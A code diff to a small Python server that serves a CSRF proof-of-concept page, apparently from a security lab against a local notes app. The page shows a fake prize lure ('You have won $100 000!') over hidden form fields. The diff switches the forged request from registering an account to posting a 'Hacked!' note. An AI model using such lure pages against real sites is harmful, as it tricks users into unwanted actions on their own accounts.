@@ -7,12 +7,11 @@ class Handler(BaseHTTPRequestHandler):
         self.end_headers()
 
         html = """
-        <form action="http://127.0.0.1:8000/notes/register/" method="post">
+        <form action="http://127.0.0.1:8000/notes/create_note/" method="post">
             <p>You have won $100 000!</p>
             <p>Click here to claim your prize:</p>
-            <input type="hidden" name="username" value="evil_user">
-            <input type="hidden" name="password1" value="password">
-            <input type="hidden" name="password2" value="password">
+            <input type="hidden" name="title" value="Hacked!">
+            <input type="hidden" name="content" value="You have been hacked!">
             <input type="submit" value="Claim prize!">
         </form>
         """
